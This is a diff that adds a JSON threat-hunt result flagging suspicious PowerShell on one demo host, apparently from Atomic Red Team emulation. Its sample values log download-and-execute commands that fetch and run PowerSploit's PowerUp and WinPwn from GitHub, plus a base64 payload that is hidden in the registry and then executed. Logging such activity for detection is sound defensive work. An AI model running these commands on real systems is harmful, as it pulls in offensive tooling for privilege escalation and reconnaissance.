@@ -1,0 +1,68 @@
+{
+  "hunt": "suspicious_powershell",
+  "category": "endpoint",
+  "status": "suspicious",
+  "findings": 8,
+  "severity": "high",
+  "columns": [
+    "@timestamp",
+    "host.name",
+    "host.hostname",
+    "event.action",
+    "process.name",
+    "process.executable",
+    "process.command_line"
+  ],
+  "entities": {
+    "hosts": [
+      "LB-CCDEMO-01-RD"
+    ]
+  },
+  "sample_values": [
+    [
+      "2026-03-14T19:26:55.000Z",
+      "LB-CCDEMO-01-RD",
+      "LB-CCDEMO-01-RD",
+      null,
+      null,
+      null,
+      "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks}"
+    ],
+    [
+      "2026-03-14T19:26:47.000Z",
+      "LB-CCDEMO-01-RD",
+      "LB-CCDEMO-01-RD",
+      null,
+      null,
+      null,
+      "\"powershell.exe\" & {# Encoded payload in next command is the following \\\"\"Set-Content -path \\\"\"$env:SystemRoot/Temp/art-marker.txt\\\"\" -value \\\"\"Hello from the Atomic Red Team\\\"\"\\\"\"\nreg.exe add \\\"\"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\\\"\" /v ART /t REG_SZ /d \\\"\"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\\\"\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))}"
+    ],
+    [
+      "2026-03-14T15:14:22.000Z",
+      "LB-CCDEMO-01-RD",
+      "LB-CCDEMO-01-RD",
+      null,
+      null,
+      null,
+      "\"powershell.exe\" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive}"
+    ],
+    [
+      "2026-03-14T15:14:22.000Z",
+      "LB-CCDEMO-01-RD",
+      "LB-CCDEMO-01-RD",
+      null,
+      null,
+      null,
+      "\"powershell.exe\" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput}"
+    ],
+    [
+      "2026-03-14T15:14:22.000Z",
+      "LB-CCDEMO-01-RD",
+      "LB-CCDEMO-01-RD",
+      null,
+      null,
+      null,
+      "\"powershell.exe\" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput}"
+    ]
+  ]
+}
